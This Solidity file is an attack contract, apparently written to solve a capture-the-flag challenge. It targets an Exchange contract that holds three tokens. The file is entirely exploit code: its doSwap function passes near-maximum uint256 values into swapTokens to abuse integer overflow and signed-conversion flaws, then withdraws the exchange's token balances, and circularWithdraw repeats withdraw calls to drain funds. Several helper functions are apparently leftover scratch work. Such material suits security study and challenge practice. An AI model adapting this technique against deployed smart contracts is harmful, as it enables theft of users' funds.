// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import "../contracts/Exchange.sol";

contract Attack {
    uint256 public maxUint;
    int256 public maxInt;
    uint256 public difference;
 
    address owner;
    Setup setup;
    Exchange exchange;
    Token token1;
    Token token2;
    Token token3;
 
    constructor(address setup_) {
        maxUint = type(uint256).max;
        maxInt = type(int256).max;
        difference = maxUint - uint256(maxInt);
        owner = msg.sender;
 
        setup = Setup(setup_);
        exchange = setup.exchange();
        token1 = setup.token1();
        token2 = setup.token2();
        token3 = setup.token3();
    }
 
    function test(uint256 test_) public pure returns(int256) {
        return int256(test_);
    }
 
    function toCallValue(uint256 liquidity) public pure returns(uint256) {
        return 57896044618658097711785492504343953926634992332820282019728792003956564819968+(57896044618658097711785492504343953926634992332820282019728792003956564819968-liquidity);
    }
 
    function attack() public {
        exchange.swap();
    }
 
    function circularWithdraw(Token token_, uint256 amount, uint256 value) internal {
        uint256 iterations = amount / token_.balanceOf(address(this));
        address ex = address(exchange);
 
        for (uint256 i = 0; i < iterations; ++i) {
            token_.transfer(ex, value);
            exchange.withdraw(address(token_), value);
        }
 
        token_.transfer(ex, token_.balanceOf(address(this)));
        exchange.withdraw(address(token_), token_.balanceOf(ex));
    }
    // Positions
    // Token1: 200001+99999
    // Token2: 200001+99999
    // Token3: 400001+199999
    function doSwap() external {
        uint256 maxU =   115792089237316195423570985008687907853269984665640564039457584007913129639935;
        uint256 value1 = 115792089237316195423570985008687907853269984665640564039457584007913129439936;
        uint256 value2 = 115792089237316195423570985008687907853269984665640564039457584007913129239936;
 
        exchange.swapTokens(address(token1), address(token2), value1-1, 99999);
        exchange.swapTokens(address(token2), address(token3), value1-1, 199999);
        exchange.swapTokens(address(token3), address(token1), value2-1, 99999);
 
        exchange.withdraw(address(token1), 200000);
        exchange.withdraw(address(token2), 200000);
        exchange.withdraw(address(token3), 400000);
 
        token1.transfer(address(exchange), 100000);
        token2.transfer(address(exchange), 100000);
        token3.transfer(address(exchange), 200000);
 
        exchange.withdraw(address(token1), 100000);
        exchange.withdraw(address(token2), 100000);
        exchange.withdraw(address(token3), 200000);
    }
 
    function getAmount() public pure returns(uint256 amount) {
        amount = uint256(type(int256).max) + 1;
    }
 
    function vaidate() public pure returns(bool) {
        return 115792089237316195423570985008687907853269984665640564039457584007913129639935 == type(uint256).max;
    }
 
    function swapTokens(uint256 amountIn, uint256 amountOut) public pure {
        uint256 liquidityBefore = 100000000;
 
        require(liquidityBefore > 0, "no liquidity");
 
        uint256 newReservesIn = 200000 + amountIn;
        uint256 newReservesOut = 200000 - amountOut;
 
        uint256 liquidityAfter = newReservesIn * newReservesOut;
 
        require(liquidityAfter >= liquidityBefore, "insufficient liquidity");
    }
}